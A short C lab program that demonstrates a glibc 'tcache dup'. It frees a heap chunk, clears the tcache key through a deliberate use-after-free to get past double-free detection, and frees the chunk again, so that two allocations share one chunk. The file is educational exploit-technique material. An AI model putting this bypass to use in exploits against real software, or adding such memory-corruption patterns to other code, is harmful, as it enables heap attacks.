#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REQUEST_SIZE 0x40

_Static_assert(sizeof(void *) == 8,
               "This lab requires 64-bit pointers");

static void *victim;
static void *first;
static void *second;


// STEP 1: First free
__attribute__((noinline))
static void release_once(void)
{
    free(victim);
}


// STEP 2: Clear the glibc tcache key
// Intentional use-after-free for this lab
__attribute__((noinline))
static void clear_tcache_key(void)
{
    ((uintptr_t *)victim)[1] = 0;
}


// STEP 3: Second free
__attribute__((noinline))
static void release_again(void)
{
    free(victim);
}


int main(void)
{
    setbuf(stdout, NULL);

    // Allocate a heap chunk
    victim = malloc(REQUEST_SIZE);

    if (victim == NULL)
    {
        perror("malloc");
        return 1;
    }

    memset(victim, 'A', REQUEST_SIZE);

    printf("Victim chunk: %p\n", victim);


    // First free
    release_once();


    // Bypass modern tcache duplicate-free detection
    clear_tcache_key();


    // Second free
    release_again();


    // Two allocations
    first = malloc(REQUEST_SIZE);

    second = malloc(REQUEST_SIZE);


    printf("First allocation : %p\n", first);
    printf("Second allocation: %p\n", second);


    if (first == second)
    {
        printf("\n[+] TCACHE DUP SUCCESS\n");

        strcpy(first, "WRITTEN_THROUGH_FIRST");

        printf("Read through second: %s\n",
               (char *)second);
    }
    else
    {
        printf("\n[-] Tcache duplication failed\n");
    }

    // Do not free first and second:
    // They intentionally refer to the same chunk.

    return 0;
}
